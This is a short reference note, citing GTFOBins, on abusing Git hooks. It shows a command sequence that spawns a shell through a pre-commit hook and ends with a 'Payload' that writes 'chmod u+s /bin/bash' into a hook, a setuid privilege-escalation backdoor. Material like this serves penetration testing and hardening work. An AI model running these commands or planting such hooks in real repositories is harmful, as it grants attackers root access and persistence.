https://gtfobins.github.io/gtfobins/git/
Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.

```
TF=$(mktemp -d)
git init "$TF"
echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
git -C "$TF" commit --allow-empty -m x
```

# Pre-commit hooks
All pre-commit hooks are executed before a commit is finalized in Git. When you attempt to commit changes with `git commit`, the pre-commit hook is triggered. This is the first hook to be run when committing changes. It serves as a check or control point before the changes are actually committed to the repository.

Here's a closer look at how it works:

- If the pre-commit hook script exits with a non-zero status, Git aborts the commit process before it even starts. This is useful for running tests, code linting, or any other checks you want to pass before allowing a commit to be made.
- If the pre-commit hook script exits with a status of 0 (success), Git proceeds with the commit process.
### Payload
`echo 'chmod u+s /bin/bash' > ~/.git/hooks/pre-commit`
